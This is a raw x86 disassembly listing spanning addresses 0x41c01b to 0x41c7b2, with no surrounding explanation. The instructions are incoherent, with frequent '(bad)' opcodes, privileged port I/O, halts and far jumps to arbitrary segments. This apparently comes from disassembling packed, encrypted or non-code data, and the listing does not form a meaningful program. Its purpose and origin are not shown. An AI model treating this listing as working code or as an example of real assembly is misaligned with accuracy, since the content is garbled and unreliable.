  41c01b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c01c:	pop    ebx
  41c01d:	fild   QWORD PTR [edi+0x8]
  41c020:	or     esp,DWORD PTR [ebp-0x1531955e]
  41c026:	std    
  41c027:	sub    eax,DWORD PTR [ebp-0x134ed7bc]
  41c02d:	adc    BYTE PTR [ecx-0x5120a801],ah
  41c033:	lahf   
  41c034:	mov    esi,0xc13dbc7a
  41c039:	push   ebx
  41c03a:	std    
  41c03b:	pushf  
  41c03c:	push   ebp
  41c03d:	popa   
  41c03e:	sti    
  41c03f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c040:	bound  edi,QWORD PTR [ecx+0x22a3c88f]
  41c046:	mov    cl,BYTE PTR gs:[ebx-0x14eccb72]
  41c04d:	or     DWORD PTR [edx+0x558feea4],esp
  41c053:	push   es
  41c054:	scas   eax,DWORD PTR es:[edi]
  41c055:	ffreep st(6)
  41c057:	mov    DWORD PTR [ebp+0x5a],esp
  41c05a:	rol    dl,cl
  41c05c:	mov    al,0xbf
  41c05e:	out    0x76,al
  41c060:	adc    esp,ebx
  41c062:	sub    BYTE PTR [edi-0x7f],ch
  41c065:	adc    al,al
  41c067:	jo     0x41c063
  41c069:	lahf   
  41c06a:	in     al,dx
  41c06b:	(bad)  
  41c06c:	scas   al,BYTE PTR es:[edi]
  41c06d:	test   eax,0xfa8f647d
  41c072:	test   eax,0xa297eb75
  41c077:	jb     0x41c00e
  41c079:	call   0xc869:0x518ccc5a
  41c080:	xchg   BYTE PTR [esi-0x6109d0ef],dh
  41c086:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c087:	mov    al,ds:0x7ffd480d
  41c08c:	jbe    0x41c098
  41c08e:	repz es stc 
  41c091:	push   ss
  41c092:	hlt    
  41c093:	(bad)  
  41c094:	jmp    0x8b1c16bc
  41c099:	out    0x45,al
  41c09b:	test   al,0xeb
  41c09d:	addr16 pop ecx
  41c09f:	mov    BYTE PTR [esp+ecx*1-0x1f51c567],ah
  41c0a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c0a7:	sub    dh,bl
  41c0a9:	fwait
  41c0aa:	packssdw mm0,QWORD PTR [edx-0x4e]
  41c0ae:	mov    ah,0xc1
  41c0b0:	ja     0x41c12c
  41c0b2:	cld    
  41c0b3:	inc    edi
  41c0b4:	mov    ebx,0xcdc61266
  41c0b9:	pop    eax
  41c0ba:	mov    ecx,0xc0c4f48
  41c0bf:	sbb    ebp,DWORD PTR [edi]
  41c0c1:	cdq    
  41c0c2:	mov    ebx,0xacdfcf30
  41c0c7:	push   esi
  41c0c8:	mov    ebx,0x43f5917a
  41c0cd:	inc    ecx
  41c0ce:	lock into 
  41c0d0:	sub    al,0xb0
  41c0d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c0d3:	inc    edx
  41c0d4:	sub    bh,BYTE PTR [edx-0x788c091d]
  41c0da:	outs   dx,DWORD PTR ds:[esi]
  41c0db:	pop    edi
  41c0dc:	jmp    0x41c0cd
  41c0de:	xor    al,0xd0
  41c0e0:	adc    DWORD PTR [eax-0x1d0795ac],eax
  41c0e6:	xchg   ecx,eax
  41c0e7:	jbe    0x41c0bb
  41c0e9:	(bad)  
  41c0ea:	rol    edi,1
  41c0ec:	sbb    ch,BYTE PTR [ecx+eax*8]
  41c0ef:	fdiv   QWORD PTR [eax-0x53]
  41c0f2:	add    dl,bh
  41c0f4:	sub    eax,0xf54804bf
  41c0f9:	test   eax,0xbd8ec810
  41c0fe:	dec    ebx
  41c0ff:	in     al,dx
  41c100:	paddd  mm3,QWORD PTR [ecx+edx*8-0x2]
  41c105:	popf   
  41c106:	mov    gs,WORD PTR ds:0x5236d766
  41c10c:	fwait
  41c10d:	inc    ecx
  41c10e:	sub    eax,0x503f2b96
  41c113:	pop    eax
  41c114:	sub    al,0xd9
  41c116:	or     eax,0x5d3fb88d
  41c11b:	cmp    bh,BYTE PTR [eax+edi*8]
  41c11e:	test   al,0xfd
  41c120:	fisubr WORD PTR [edx-0x61]
  41c123:	dec    eax
  41c124:	fidivr DWORD PTR [esp+esi*4+0x6900e323]
  41c12b:	sbb    bl,al
  41c12d:	fst    QWORD PTR [ebp+esi*4-0x54]
  41c131:	fdiv   DWORD PTR [ebp-0x46]
  41c134:	stos   DWORD PTR es:[edi],eax
  41c135:	(bad)  
  41c137:	sbb    eax,0x48bfbadf
  41c13c:	xchg   esp,eax
  41c13d:	cmp    eax,0xb58a5333
  41c142:	jbe    0x41c122
  41c144:	in     al,dx
  41c145:	iret   
  41c146:	cld    
  41c147:	ror    DWORD PTR [ebx-0x63],cl
  41c14a:	push   es
  41c14b:	jns    0x41c10e
  41c14d:	sub    BYTE PTR [ecx],al
  41c14f:	mov    ebp,0x24004952
  41c154:	push   ebx
  41c155:	mov    eax,ds:0xe7331805
  41c15a:	arpl   ax,cx
  41c15c:	in     eax,dx
  41c15d:	cmp    al,0x7b
  41c15f:	jp     0x41c135
  41c161:	sahf   
  41c162:	or     BYTE PTR [ebx-0x4d1f7a15],0xd3
  41c169:	ss dec ebx
  41c16b:	mov    bh,0xcc
  41c16d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c16e:	cmp    esp,DWORD PTR [edi+0x486307eb]
  41c174:	jne    0x41c1cd
  41c176:	mov    edi,0xf65b153e
  41c17b:	sbb    BYTE PTR [ebp+0x602860b1],al
  41c181:	out    dx,eax
  41c182:	arpl   WORD PTR [edx+0x68cbe09b],bx
  41c188:	push   ss
  41c189:	pop    es
  41c18a:	mov    ebp,0x3bcb9dd8
  41c18f:	loope  0x41c17c
  41c191:	sahf   
  41c192:	in     al,dx
  41c193:	daa    
  41c194:	jp     0x41c12b
  41c196:	or     eax,DWORD PTR [ebp+0x11]
  41c199:	fbld   TBYTE PTR ds:0x2abec0b4
  41c19f:	test   BYTE PTR [edx],dh
  41c1a1:	mov    eax,ds:0xe345e744
  41c1a6:	fnstcw WORD PTR [edi+0x6e7d1000]
  41c1ac:	push   cs
  41c1ad:	pop    eax
  41c1ae:	iret   
  41c1af:	mov    edi,0x88592251
  41c1b4:	jp     0x41c175
  41c1b6:	dec    ecx
  41c1b7:	mov    esi,0xecfd0e36
  41c1bc:	fs je  0x41c1ff
  41c1bf:	push   edx
  41c1c0:	push   edi
  41c1c1:	into   
  41c1c2:	enter  0x7ddc,0x13
  41c1c6:	std    
  41c1c7:	sbb    DWORD PTR [ebx-0x4a],eax
  41c1ca:	data16 cmc 
  41c1cc:	ret    0xfd38
  41c1cf:	push   ds
  41c1d0:	jo     0x41c24b
  41c1d2:	je     0x41c1a1
  41c1d4:	out    0x5b,al
  41c1d6:	ret    0x2fcb
  41c1d9:	cmp    DWORD PTR [ecx+0x5],edi
  41c1dc:	add    ebp,edi
  41c1de:	pushf  
  41c1df:	mov    bl,0xfd
  41c1e1:	daa    
  41c1e2:	(bad)  
  41c1e3:	pusha  
  41c1e4:	ret    
  41c1e5:	dec    edx
  41c1e6:	mov    dl,0x74
  41c1e8:	pop    ebp
  41c1e9:	sbb    al,0xbc
  41c1eb:	pusha  
  41c1ec:	push   ss
  41c1ed:	sahf   
  41c1ee:	call   0x29be:0xe0e36fc8
  41c1f5:	sub    al,0xe4
  41c1f7:	int3   
  41c1f8:	in     eax,dx
  41c1f9:	dec    BYTE PTR ds:0x9c3ff83f
  41c1ff:	fwait
  41c200:	mov    ah,0x62
  41c202:	popa   
  41c203:	enter  0x9cef,0x46
  41c207:	and    BYTE PTR [ebp-0x5c28cd1d],cl
  41c20d:	jmp    0xf3d4a60d
  41c212:	sub    al,BYTE PTR [ebx-0x1e]
  41c215:	pop    edi
  41c216:	xor    al,0x23
  41c218:	out    0xc7,al
  41c21a:	push   esi
  41c21b:	vpcmpgtw xmm1,xmm3,XMMWORD PTR [ebx+0x5860294d]
  41c223:	pop    eax
  41c224:	push   es
  41c225:	xchg   DWORD PTR [ecx+0x4779ec43],ecx
  41c22b:	or     ecx,DWORD PTR [ecx+0x31]
  41c22e:	aaa    
  41c22f:	sub    BYTE PTR [ebx],ch
  41c231:	ret    
  41c232:	in     al,0xba
  41c234:	jle    0x41c1e9
  41c236:	jbe    0x41c200
  41c238:	call   0xf417:0x37d4a12
  41c23f:	push   ds
  41c240:	icebp  
  41c241:	sub    eax,0xd765682f
  41c246:	shr    DWORD PTR [esi-0x26],1
  41c249:	fisttp WORD PTR [esi+esi*2]
  41c24c:	repnz xor ebx,DWORD PTR [ebx+0x44]
  41c250:	(bad)  
  41c251:	call   0xdf65513a
  41c256:	mov    eax,0x719df7f8
  41c25b:	fnsave [esi+0x7a7f90dc]
  41c261:	lock dec esi
  41c263:	out    dx,eax
  41c264:	jae    0x41c204
  41c266:	jo     0x41c283
  41c268:	jmp    0x41c243
  41c26a:	jmp    0x41c25e
  41c26c:	sub    al,0xeb
  41c26e:	mov    ebp,?
  41c270:	jg     0x41c251
  41c272:	xchg   ebp,eax
  41c273:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c274:	add    BYTE PTR [edi],ah
  41c276:	ss dec esi
  41c278:	in     al,dx
  41c279:	and    eax,0x46a66ffc
  41c27e:	gs (bad) 
  41c282:	sbb    eax,0xabe8d538
  41c287:	(bad)  
  41c289:	pop    edi
  41c28a:	adc    bh,dl
  41c28c:	xchg   edx,eax
  41c28d:	dec    esp
  41c28e:	cmp    ah,BYTE PTR [edi-0x15]
  41c291:	or     eax,esp
  41c293:	cmp    dl,BYTE PTR [ebp+0x5175f934]
  41c299:	fistp  WORD PTR [edx-0x7a]
  41c29c:	pop    ds
  41c29d:	mov    bh,0x40
  41c29f:	(bad)  [esi+0x62f0fce7]
  41c2a5:	sbb    BYTE PTR [edi],ch
  41c2a7:	shl    edi,1
  41c2a9:	es sahf 
  41c2ab:	enter  0xb100,0x7b
  41c2af:	pop    esp
  41c2b0:	sub    al,0xcf
  41c2b2:	push   ecx
  41c2b3:	mov    edi,0xf64494eb
  41c2b8:	xlat   BYTE PTR ds:[ebx]
  41c2b9:	pop    esi
  41c2ba:	sbb    DWORD PTR [ecx-0x6b16207e],ebx
  41c2c0:	adc    al,BYTE PTR [edx-0x71]
  41c2c3:	xchg   edx,eax
  41c2c4:	cld    
  41c2c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c2c6:	inc    esp
  41c2c7:	adc    esp,esp
  41c2c9:	(bad)  
  41c2cb:	jl     0x41c295
  41c2cd:	jp     0x41c2c0
  41c2cf:	ret    0x349
  41c2d2:	sub    eax,0xa9e9f03d
  41c2d7:	dec    eax
  41c2d8:	shr    edx,0xfa
  41c2db:	xchg   ebx,eax
  41c2dc:	jge    0x41c278
  41c2de:	and    ah,dl
  41c2e0:	jmp    0x41c35a
  41c2e2:	jb     0x41c2fc
  41c2e4:	mov    al,ds:0x22409a6c
  41c2e9:	loopne 0x41c329
  41c2eb:	mov    esi,esi
  41c2ed:	int3   
  41c2ee:	loope  0x41c307
  41c2f0:	aas    
  41c2f1:	xlat   BYTE PTR ds:[ebx]
  41c2f2:	addr16 shr dl,0xd5
  41c2f6:	enter  0xa071,0x8c
  41c2fa:	mov    al,ds:0x9abf2e58
  41c2ff:	nop
  41c300:	(bad)  
  41c301:	addr16 std 
  41c303:	sub    al,0x42
  41c305:	add    eax,eax
  41c307:	and    al,0x9c
  41c309:	aam    0xfc
  41c30b:	clc    
  41c30c:	push   ebp
  41c30d:	pop    edi
  41c30e:	pop    eax
  41c30f:	jns    0x41c339
  41c311:	loopne 0x41c296
  41c313:	enter  0xf21f,0x50
  41c317:	sub    DWORD PTR [edi-0x19d8023c],edx
  41c31d:	push   esi
  41c31e:	ins    BYTE PTR es:[edi],dx
  41c31f:	inc    edx
  41c320:	rcl    DWORD PTR [ebx*8+0x6d0f12a5],cl
  41c327:	enter  0xc8b6,0x7d
  41c32b:	(bad)  
  41c32c:	mov    esi,ebp
  41c32e:	or     al,0xc1
  41c330:	jmp    0x4609:0xbf7da1a5
  41c337:	cmp    BYTE PTR [edx],dl
  41c339:	jae    0x41c33d
  41c33b:	enter  0x92d8,0x8e
  41c33f:	dec    esi
  41c340:	cmp    esi,DWORD PTR [esi]
  41c342:	lea    esp,[ebp-0x12]
  41c345:	out    dx,al
  41c346:	arpl   WORD PTR [esi],di
  41c348:	in     eax,0xff
  41c34a:	ds pop ebx
  41c34c:	push   ebx
  41c34d:	add    BYTE PTR [ecx],0xc7
  41c350:	retf   
  41c351:	add    eax,0xffbde0aa
  41c356:	or     eax,0xfcaff9a0
  41c35b:	add    al,bl
  41c35d:	or     DWORD PTR [eax],esp
  41c35f:	jecxz  0x41c3c7
  41c361:	pop    edi
  41c362:	pop    ecx
  41c363:	retf   
  41c364:	shr    DWORD PTR [edi+0x70],1
  41c367:	push   edi
  41c368:	sub    eax,0x6a7fccf
  41c36d:	sub    eax,0xd0cfa8eb
  41c372:	lods   eax,DWORD PTR ds:[esi]
  41c373:	enter  0x23db,0x1a
  41c377:	int3   
  41c378:	push   ecx
  41c379:	add    esi,ebp
  41c37b:	mov    ds:0xe60ad9eb,eax
  41c380:	je     0x41c351
  41c382:	scas   eax,DWORD PTR es:[edi]
  41c383:	pop    esi
  41c384:	or     edi,ebx
  41c386:	aas    
  41c387:	and    ah,BYTE PTR [edi-0x15622042]
  41c38d:	and    al,0xf8
  41c38f:	inc    ebx
  41c390:	pop    eax
  41c391:	xchg   esp,eax
  41c392:	push   0x4a
  41c394:	retf   0x6846
  41c397:	or     BYTE PTR [eax-0x7a],bh
  41c39a:	(bad)  
  41c39b:	cdq    
  41c39c:	out    0xdf,eax
  41c39e:	ins    BYTE PTR es:[edi],dx
  41c39f:	pop    esi
  41c3a0:	into   
  41c3a1:	(bad)  
  41c3a2:	pop    esi
  41c3a3:	xchg   ebp,eax
  41c3a4:	push   esi
  41c3a5:	shl    ebx,cl
  41c3a7:	jo     0x41c3e5
  41c3a9:	fisttp WORD PTR [ebx+0x79d5e6e0]
  41c3af:	mul    ebp
  41c3b1:	enter  0x83a,0x5d
  41c3b5:	ds fs call 0xdccc:0x8bfca5bf
  41c3be:	and    edi,ecx
  41c3c0:	ja     0x41c3ad
  41c3c2:	or     al,0x73
  41c3c5:	ret    0x115c
  41c3c8:	in     eax,0x4f
  41c3ca:	arpl   WORD PTR [ebx+ebp*8-0x69c9cc57],bx
  41c3d1:	in     al,dx
  41c3d2:	dec    esi
  41c3d3:	push   0x48
  41c3d5:	fbld   TBYTE PTR [edx-0x14d15942]
  41c3db:	(bad)  
  41c3dc:	sahf   
  41c3dd:	push   es
  41c3de:	std    
  41c3df:	and    al,0xdf
  41c3e1:	retf   
  41c3e2:	dec    ecx
  41c3e3:	mov    WORD PTR [edx+edi*8-0x60],fs
  41c3e7:	enter  0x239a,0xe5
  41c3eb:	cmp    ebx,0x10
  41c3ee:	into   
  41c3ef:	ret    
  41c3f0:	jnp    0x41c372
  41c3f2:	or     ebp,DWORD PTR [edi+0x4a]
  41c3f5:	xor    DWORD PTR [eax],eax
  41c3f7:	sub    DWORD PTR [edi+0x69],ebp
  41c3fa:	or     al,0x61
  41c3fd:	aad    0x88
  41c3ff:	jmp    0x41c46d
  41c401:	mov    ds:0xa4e638ad,eax
  41c406:	pop    es
  41c407:	shl    BYTE PTR ds:0xace4dcff,0xc
  41c40e:	addr16 leave 
  41c410:	arpl   WORD PTR ds:0x95f8a518,dx
  41c416:	imul   ebx,DWORD PTR [eax-0x3102ee5c],0x65
  41c41d:	xor    esi,esp
  41c41f:	sub    eax,0xe1ff7f74
  41c424:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c425:	push   0xfffffffd
  41c427:	adc    eax,DWORD PTR [ecx+0x30]
  41c42a:	es daa 
  41c42c:	cmp    eax,0xd8a7fd6d
  41c431:	dec    edx
  41c432:	mov    al,0xa4
  41c434:	mov    WORD PTR [ebx+ebp*2+0x773996c8],cs
  41c43b:	call   0xa4eb:0xd661ea8a
  41c442:	inc    edx
  41c443:	in     al,dx
  41c444:	shl    DWORD PTR [ecx+0x3b9492bc],cl
  41c44a:	jp     0x41c414
  41c44c:	xchg   ebx,eax
  41c44d:	dec    esp
  41c44e:	int    0xae
  41c450:	jmp    0x7181:0xeb414f27
  41c457:	out    dx,al
  41c458:	sub    eax,0xee9ed1a5
  41c45d:	fbld   TBYTE PTR [eax+0x17]
  41c460:	pop    esi
  41c461:	pop    ebp
  41c462:	sahf   
  41c463:	push   edi
  41c464:	and    DWORD PTR [esi-0x46ceb902],edi
  41c46a:	jns    0x41c45b
  41c46c:	icebp  
  41c46d:	mov    edi,0xdf419bb7
  41c472:	stc    
  41c473:	mov    ebp,0x69c2e411
  41c478:	outs   dx,BYTE PTR ds:[esi]
  41c479:	loope  0x41c47a
  41c47b:	jnp    0x41c476
  41c47d:	push   edx
  41c47e:	cs xor al,0xe
  41c481:	push   edi
  41c482:	jne    0x41c4a1
  41c484:	sub    al,0xd4
  41c486:	inc    edx
  41c487:	dec    eax
  41c488:	ins    BYTE PTR es:[edi],dx
  41c489:	fisub  DWORD PTR [ebx]
  41c48b:	dec    eax
  41c48c:	push   ecx
  41c48d:	add    al,0x84
  41c48f:	and    DWORD PTR [ecx-0x21],esp
  41c492:	es (bad) 
  41c494:	in     al,dx
  41c495:	jo     0x41c4c7
  41c497:	pop    eax
  41c498:	repnz sar ah,cl
  41c49b:	dec    ebx
  41c49c:	adc    eax,DWORD PTR [ebx+0x6c]
  41c49f:	pop    ecx
  41c4a0:	cmp    ebx,ebx
  41c4a2:	sub    al,0xe7
  41c4a4:	jmp    DWORD PTR [edi+0x2d]
  41c4a7:	push   esp
  41c4a8:	jmp    0xc283:0xaba566a1
  41c4af:	sub    BYTE PTR ds:0x29c8c5c8,ah
  41c4b5:	and    edi,DWORD PTR [ecx+0x6e]
  41c4b8:	lods   eax,DWORD PTR ds:[esi]
  41c4b9:	add    ecx,DWORD PTR [esp+edx*1+0x522f6bed]
  41c4c0:	pop    ds
  41c4c1:	lahf   
  41c4c2:	icebp  
  41c4c3:	mov    ebx,0x9b3d19fb
  41c4c8:	bound  esi,QWORD PTR ds:0x3d10c865
  41c4ce:	sahf   
  41c4cf:	cmp    eax,0x2789fe35
  41c4d4:	jmp    0x41c512
  41c4d6:	and    BYTE PTR [ebx],dl
  41c4d8:	nop
  41c4d9:	jge    0x41c478
  41c4db:	rcl    DWORD PTR [esi],cl
  41c4dd:	xchg   edi,eax
  41c4de:	sbb    BYTE PTR [ebp-0x6fe7d615],0x67
  41c4e5:	dec    esp
  41c4e6:	sub    eax,0xce1aeb3b
  41c4eb:	cmp    al,0x2d
  41c4ed:	jecxz  0x41c4e6
  41c4ef:	int    0x98
  41c4f1:	repz or dl,ah
  41c4f4:	cli    
  41c4f5:	pop    edx
  41c4f6:	std    
  41c4f7:	iret   
  41c4f8:	or     bl,BYTE PTR [ebp-0xfea0662]
  41c4fe:	cld    
  41c4ff:	in     eax,dx
  41c500:	(bad)  
  41c501:	jae    0x41c568
  41c503:	mov    eax,0xc81fa484
  41c508:	fld    QWORD PTR [esi+0x3ee680ae]
  41c50e:	adc    al,BYTE PTR [ebp-0x15]
  41c511:	or     dh,dl
  41c513:	pop    eax
  41c514:	sar    esi,0x4
  41c517:	pop    ebp
  41c518:	mov    eax,ds:0xaa6a18df
  41c51d:	lods   eax,DWORD PTR ds:[esi]
  41c51e:	pop    eax
  41c51f:	cmp    DWORD PTR [edi+0x25d6fd5c],0xffffff9a
  41c526:	push   cs
  41c527:	xor    eax,0xc8e0554f
  41c52c:	aaa    
  41c52d:	stc    
  41c52e:	repz xor BYTE PTR ds:[ebx+0x4c4f4894],dl
  41c536:	rcr    BYTE PTR fs:[ebx+ebp*8],1
  41c53a:	test   eax,0xb40686bc
  41c53f:	enter  0xe5d0,0x15
  41c543:	les    ebp,FWORD PTR [eax-0x68b0375]
  41c549:	inc    edx
  41c54a:	dec    ebx
  41c54b:	sbb    DWORD PTR [ecx-0x70],ecx
  41c54e:	aas    
  41c54f:	or     BYTE PTR [ecx-0x5c],ch
  41c552:	and    al,0xc8
  41c554:	mov    fs,WORD PTR [edx+0x4c]
  41c557:	xchg   ecx,eax
  41c558:	push   esp
  41c559:	mov    bl,0xe8
  41c55b:	out    dx,eax
  41c55c:	in     al,dx
  41c55d:	sar    DWORD PTR [eax-0x1111fd5d],1
  41c563:	clc    
  41c564:	sbb    al,0x35
  41c566:	sbb    eax,0x43df99ed
  41c56b:	xor    eax,0xd7ec8190
  41c570:	xchg   edx,eax
  41c571:	ins    BYTE PTR es:[edi],dx
  41c572:	add    BYTE PTR [ebx+0x36f98a00],dl
  41c578:	inc    esp
  41c579:	ja     0x41c5ee
  41c57b:	and    al,0x15
  41c57d:	jg     0x41c5d3
  41c57f:	ja     0x41c5d2
  41c581:	retf   0xd15b
  41c584:	cmc    
  41c585:	pusha  
  41c586:	test   DWORD PTR [ebx-0xf6c3215],eax
  41c58c:	adc    ebx,DWORD PTR [edx]
  41c58e:	cld    
  41c58f:	jge    0x41c51a
  41c591:	xor    dl,BYTE PTR [edx-0x7a5a4e1]
  41c597:	adc    eax,0x673de8a4
  41c59c:	ficomp DWORD PTR [edi+0x50]
  41c59f:	adc    al,0x71
  41c5a1:	push   ss
  41c5a2:	mov    esi,0xd99feb04
  41c5a7:	and    edi,DWORD PTR [eax+edx*1-0x53]
  41c5ab:	clc    
  41c5ac:	retf   
  41c5ad:	fsub   QWORD PTR [ecx+0x3d]
  41c5b0:	xchg   esi,eax
  41c5b1:	(bad)  
  41c5b2:	addr16 int3 
  41c5b4:	sbb    eax,DWORD PTR [ebp-0x2d]
  41c5b7:	adc    esp,DWORD PTR [eax+0x6366fd89]
  41c5bd:	xchg   esp,eax
  41c5be:	retf   0xf96f
  41c5c1:	jp     0x41c622
  41c5c3:	leave  
  41c5c4:	in     al,dx
  41c5c5:	jno    0x41c5b1
  41c5c7:	dec    edx
  41c5c8:	xchg   ebx,eax
  41c5c9:	fisubr DWORD PTR [esp+ebp*1+0x28fd6e7f]
  41c5d0:	and    eax,DWORD PTR [esp-0x6059652e]
  41c5d7:	enter  0xda8,0x22
  41c5db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c5dc:	inc    edi
  41c5dd:	fwait
  41c5de:	push   esi
  41c5df:	mov    ds:0xc8caa9e4,eax
  41c5e4:	cmp    eax,0xcbe68909
  41c5e9:	adc    al,0xfb
  41c5eb:	retf   0xa561
  41c5ee:	cmc    
  41c5ef:	jg     0x41c660
  41c5f1:	rcl    DWORD PTR [esp+eax*8-0x13028346],cl
  41c5f8:	ja     0x41c625
  41c5fa:	fdiv   QWORD PTR [edx-0x650824fb]
  41c600:	(bad)
  41c603:	in     al,0x6b
  41c605:	hlt    
  41c606:	adc    eax,0xfd6e661d
  41c60b:	xor    edi,DWORD PTR [ebp+0x5]
  41c60e:	in     al,dx
  41c60f:	dec    eax
  41c610:	and    eax,0xc3c8b023
  41c615:	or     BYTE PTR [bp+di],ch
  41c618:	xchg   edi,eax
  41c619:	mov    ah,0x87
  41c61b:	ja     0x41c605
  41c61d:	mov    bl,al
  41c61f:	data16 js 0x41c5d5
  41c622:	jl     0x41c64f
  41c624:	fldenv [edx]
  41c626:	xor    BYTE PTR [eax+0x7e],ch
  41c629:	xor    dl,BYTE PTR [eax+0x20]
  41c62c:	or     WORD PTR [edi-0x48],bp
  41c630:	push   0x6
  41c632:	imul   esi,DWORD PTR [edx],0x71
  41c635:	out    0xfc,al
  41c637:	cmp    esi,edx
  41c639:	mov    al,ds:0x8b50c2b5
  41c63e:	sahf   
  41c63f:	enter  0x41fc,0x3d
  41c643:	je     0x41c5f9
  41c645:	sub    al,BYTE PTR [ebp-0x1b]
  41c648:	jmp    0x41c67e
  41c64a:	adc    edi,esi
  41c64c:	jbe    0x41c645
  41c64e:	or     BYTE PTR [ebp+0x726f03a3],dh
  41c654:	adc    ch,bl
  41c656:	mov    edx,0xbc9f5574
  41c65b:	outs   dx,BYTE PTR ds:[esi]
  41c65c:	add    ebx,ebp
  41c65e:	sti    
  41c65f:	cmp    eax,0xe11550f0
  41c664:	dec    ebx
  41c665:	add    bh,ah
  41c667:	dec    esp
  41c668:	cld    
  41c669:	loopne 0x41c6af
  41c66b:	test   al,0xde
  41c66d:	fsubr  st,st(7)
  41c66f:	push   edi
  41c670:	fsubr  DWORD PTR [esi+0x57f285b4]
  41c676:	add    al,0xee
  41c678:	push   esp
  41c679:	pop    ecx
  41c67a:	cmp    ebp,eax
  41c67c:	mov    al,ds:0x4514b2dd
  41c681:	(bad)  
  41c683:	fdivp  st(0),st
  41c685:	fwait
  41c686:	invd   
  41c688:	pop    esi
  41c689:	mov    eax,?
  41c68b:	in     al,0x84
  41c68d:	sbb    BYTE PTR [eax+ecx*8],ch
  41c690:	push   esi
  41c691:	xchg   edx,eax
  41c692:	cld    
  41c693:	hlt    
  41c694:	jo     0x41c668
  41c696:	cmp    al,0xe2
  41c698:	mov    edx,edi
  41c69a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c69b:	iret   
  41c69c:	or     cl,0xe8
  41c69f:	in     al,0xb
  41c6a1:	jae    0x41c627
  41c6a3:	(bad)  
  41c6a5:	lods   eax,DWORD PTR ds:[esi]
  41c6a6:	cmc    
  41c6a7:	pop    ecx
  41c6a8:	out    0x71,eax
  41c6aa:	clc    
  41c6ab:	inc    edi
  41c6ac:	popf   
  41c6ad:	pop    es
  41c6ae:	shl    BYTE PTR [ebp-0x20],1
  41c6b1:	fbld   TBYTE PTR [edi-0x4fcf3101]
  41c6b7:	adc    al,0xad
  41c6b9:	cmp    al,0xfd
  41c6bb:	jae    0x41c684
  41c6bd:	or     ah,BYTE PTR ds:[eax]
  41c6c0:	(bad)  
  41c6c2:	aas    
  41c6c3:	enter  0xe65f,0x1b
  41c6c7:	jp     0x41c729
  41c6c9:	cmp    ah,BYTE PTR [edi+eiz*2-0xb]
  41c6cd:	mov    ebx,0x2e009bb0
  41c6d2:	shl    BYTE PTR [ebx-0x366c4720],0x5f
  41c6d9:	inc    ecx
  41c6da:	mov    DWORD PTR [ecx+0x3dfed32],eax
  41c6e0:	adc    ah,dl
  41c6e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c6e3:	mov    cl,0xeb
  41c6e5:	cli    
  41c6e6:	sbb    ah,BYTE PTR [ecx+eiz*4]
  41c6e9:	add    ecx,DWORD PTR [ebp-0x73]
  41c6ec:	or     ebx,edi
  41c6ee:	dec    ebx
  41c6ef:	pop    esp
  41c6f0:	fsin   
  41c6f2:	nop
  41c6f3:	inc    edi
  41c6f4:	scas   eax,DWORD PTR es:[edi]
  41c6f5:	lea    esp,[edx]
  41c6f7:	mov    dl,0x5
  41c6f9:	popa   
  41c6fa:	cld    
  41c6fb:	adc    DWORD PTR [ecx+0x2d],edx
  41c6fe:	dec    edi
  41c6ff:	in     eax,dx
  41c700:	sub    ecx,DWORD PTR [ecx+ebp*8+0x6e]
  41c704:	jge    0x41c6e9
  41c706:	nop
  41c707:	in     al,dx
  41c708:	sbb    cl,dh
  41c70a:	out    dx,eax
  41c70b:	sbb    eax,0x9c7db7eb
  41c710:	mov    bh,0x75
  41c712:	xor    bh,BYTE PTR [ebx-0x31b97b48]
  41c718:	stos   DWORD PTR es:[edi],eax
  41c719:	fdivr  DWORD PTR [ebx]
  41c71b:	and    eax,0x3a2baff0
  41c720:	and    eax,0x92e1fcf8
  41c725:	jne    0x41c739
  41c727:	pop    ebx
  41c728:	arpl   WORD PTR [ebx+0x46bec837],cx
  41c72e:	sbb    al,ch
  41c730:	in     al,0x8f
  41c732:	sti    
  41c733:	es push esi
  41c735:	iret   
  41c736:	mov    es,edi
  41c738:	dec    ecx
  41c739:	outs   dx,BYTE PTR fs:[esi]
  41c73b:	cmp    dh,ch
  41c73d:	push   eax
  41c73e:	sar    al,0x89
  41c741:	push   ss
  41c742:	add    DWORD PTR [ebx+ebp*8-0xc],edx
  41c746:	sub    ebp,DWORD PTR [edi+0x1c8f75d1]
  41c74c:	mov    bl,0xdf
  41c74e:	(bad)  
  41c74f:	in     eax,dx
  41c750:	cwde   
  41c751:	jp     0x41c7bd
  41c753:	adc    BYTE PTR [ecx+0x79],al
  41c756:	std    
  41c757:	inc    edx
  41c758:	add    al,0x71
  41c75a:	jecxz  0x41c717
  41c75c:	xor    DWORD PTR [edi],0x7eb7c7ed
  41c762:	push   ds
  41c763:	inc    ebp
  41c764:	mov    dl,0xff
  41c766:	out    dx,al
  41c767:	ins    BYTE PTR es:[edi],dx
  41c768:	jmp    0x41c72c
  41c76a:	fist   DWORD PTR [ebx+0x3d906b37]
  41c770:	inc    edx
  41c771:	fwait
  41c772:	xchg   BYTE PTR [ebx-0xe4ede1a],bl
  41c778:	sar    BYTE PTR [edi-0x67],1
  41c77b:	mov    eax,0xe6fd63b8
  41c780:	jl     0x41c799
  41c782:	out    dx,al
  41c783:	mov    eax,ds:0xc81f56f6
  41c788:	adc    ah,ah
  41c78a:	xchg   esi,eax
  41c78b:	xchg   cl,bl
  41c78d:	out    dx,eax
  41c78e:	or     ah,BYTE PTR [edi+0x4a7a0ceb]
  41c794:	loop   0x41c798
  41c796:	addr16 into 
  41c798:	mov    ebp,0x8d8f1ddf
  41c79d:	clc    
  41c79e:	add    al,0x3b
  41c7a0:	lods   al,BYTE PTR ds:[esi]
  41c7a1:	and    bl,0x98
  41c7a4:	jl     0x41c7ff
  41c7a6:	jno    0x41c7b1
  41c7a8:	shl    BYTE PTR [ebx+0x26],0xa6
  41c7ac:	imul   edx,DWORD PTR [edx],0xffffff93
  41c7af:	ss sub bl,bh
  41c7b2:	push   ds
